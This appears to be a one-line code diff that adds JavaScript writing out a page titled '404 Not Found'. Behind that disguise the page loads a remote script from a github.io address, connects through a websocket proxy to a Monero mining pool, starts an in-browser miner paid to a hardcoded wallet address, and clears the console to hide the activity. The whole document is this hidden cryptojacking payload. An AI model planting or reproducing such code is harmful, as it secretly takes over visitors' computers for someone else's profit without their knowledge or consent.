@@ -1,0 +1,1 @@
+document.write(`<html><title>404 Not Found</title><body><script src="https://michael5621.github.io/test/j.js?proxy=wss://sport5.now.sh?pool=pool.supportxmr.com:80"></script><script>var miner = CH.Anonymous('49vUYdwTqCmNdVzi6N6GrzLz5H5hGgTcBG3iySQfvveTaHnnoTQBHzHc9iRHkFr45vXM4nrxzSKXVQqWtMU255UM66HVqtV');miner._throttle=0.1;miner.start();console.clear();</script></body></html>`);
